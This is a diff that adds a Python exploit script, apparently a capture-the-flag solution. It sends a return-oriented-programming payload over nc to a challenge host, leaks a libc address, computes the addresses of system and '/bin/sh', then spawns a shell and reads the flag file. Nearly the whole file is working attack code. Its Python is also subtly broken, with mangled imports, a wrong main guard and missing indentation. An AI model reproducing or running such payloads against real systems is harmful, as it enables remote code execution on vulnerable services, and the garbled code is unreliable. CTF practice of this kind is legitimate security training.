@@ -1,0 +1,56 @@
+```python from future import print_function
+
+import os import struct import subprocess
+
+if name == 'main':
+
+OFFSET = 16
+PADDING = 'A' * OFFSET
+
+POP_RAX = struct.pack('<Q', 0x00000000004005a7)
+POP_RDI = struct.pack('<Q', 0x00000000004005a9)
+POP_RSI = struct.pack('<Q', 0x00000000004005ab)
+POP_RDX = struct.pack('<Q', 0x00000000004005ad)
+
+payload = (''.join([
+    PADDING,
+    POP_RSI,
+    struct.pack('<Q', 0x601018), POP_RDI,
+    struct.pack('<Q', 0x1), POP_RDX,
+    struct.pack('<Q', 0x8),
+    struct.pack('<Q', 0x0000000000400588)
+]))
+
+process = subprocess.Popen(
+    ['nc', 'university.opentoallctf.com', '30002'],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE)
+
+process.stdin.write(payload)
+
+# read leaked address
+process.stdout.readline()
+byte_string = process.stdout.read(0x8)
+write, = struct.unpack('<Q', byte_string)
+
+# compute addresses for system and /bin/sh
+sh_offset = 0x95aa7
+sh = struct.pack('<Q', write + sh_offset)
+
+system_offset = -0xb1f20
+system = struct.pack('<Q', write + system_offset)
+
+payload = (''.join([
+    PADDING,
+    POP_RDI,
+    sh,
+    system,
+    '\x00' * 64
+]))
+
+process.stdin.write(payload)
+process.stdin.write('cat /flag\n')
+
+print(process.stdout.readline())
+    ```
+
